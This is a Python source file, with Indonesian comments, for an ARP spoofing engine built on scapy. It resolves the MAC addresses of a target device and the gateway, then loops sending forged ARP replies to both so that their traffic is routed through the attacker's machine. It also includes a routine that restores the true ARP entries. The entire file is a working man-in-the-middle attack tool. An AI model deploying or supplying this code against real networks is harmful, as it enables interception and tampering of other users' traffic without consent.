"""ARP spoofing engine - handle MAC randomization."""
import threading
import time
from scapy.all import ARP, Ether, sendp, srp, get_if_hwaddr, conf


class ARPEngine:
    def __init__(self, interface):
        self.iface = interface
        conf.verb = 0
        try:
            self.attacker_mac = get_if_hwaddr(interface)
        except Exception:
            self.attacker_mac = None
        self._threads = {}

    def resolve_mac(self, ip, retries=5, timeout=3):
        """Resolve MAC dengan retry banyak (handle HP lambat / extender)."""
        for attempt in range(retries):
            try:
                ans, _ = srp(
                    Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                    iface=self.iface, timeout=timeout, retry=0, verbose=False)
                if ans:
                    return ans[0][1].hwsrc
            except Exception as e:
                print(f"   [!] resolve attempt {attempt+1}: {e}")
            time.sleep(1)
        return None

    def _poison_loop(self, target_ip, target_mac, gw_ip, gw_mac, stop_evt):
        to_target = Ether(dst=target_mac) / ARP(
            op=2, psrc=gw_ip, pdst=target_ip,
            hwdst=target_mac, hwsrc=self.attacker_mac)
        to_gw = Ether(dst=gw_mac) / ARP(
            op=2, psrc=target_ip, pdst=gw_ip,
            hwdst=gw_mac, hwsrc=self.attacker_mac)
        while not stop_evt.is_set():
            try:
                sendp([to_target, to_gw], iface=self.iface, verbose=False)
            except Exception:
                pass
            time.sleep(0.3)

    def start(self, target_ip, gateway_ip):
        if target_ip in self._threads:
            return True
        if not self.attacker_mac:
            print(f"   [!] MAC attacker tidak terdeteksi")
            return False

        print(f"   [i] Resolve MAC target {target_ip} (dengan retry)...")
        target_mac = self.resolve_mac(target_ip, retries=5, timeout=3)
        if not target_mac:
            print(f"   [!] Tidak bisa resolve MAC {target_ip}")
            print(f"   [!] Kemungkinan: HP pakai MAC randomization + extender lambat")
            return False
        print(f"   [i] Target MAC: {target_mac}")

        print(f"   [i] Resolve MAC gateway {gateway_ip}...")
        gw_mac = self.resolve_mac(gateway_ip, retries=3, timeout=3)
        if not gw_mac:
            print(f"   [!] Tidak bisa resolve MAC {gateway_ip}")
            return False
        print(f"   [i] Gateway MAC: {gw_mac}")

        stop = threading.Event()
        t = threading.Thread(
            target=self._poison_loop,
            args=(target_ip, target_mac, gateway_ip, gw_mac, stop),
            daemon=True)
        t.start()
        self._threads[target_ip] = (t, stop, target_mac, gw_mac)
        print(f"   [i] ARP spoof aktif untuk {target_ip}")
        return True

    def restore(self, target_ip, gateway_ip):
        entry = self._threads.pop(target_ip, None)
        if not entry:
            return
        _, stop, target_mac, gw_mac = entry
        stop.set()
        pkt = Ether(dst=target_mac) / ARP(
            op=2, psrc=gateway_ip, pdst=target_ip,
            hwdst=target_mac, hwsrc=gw_mac)
        for _ in range(5):
            try:
                sendp(pkt, iface=self.iface, verbose=False)
            except Exception:
                pass
            time.sleep(0.3)

    def stop_all(self, gateway_ip):
        for ip in list(self._threads.keys()):
            self.restore(ip, gateway_ip)
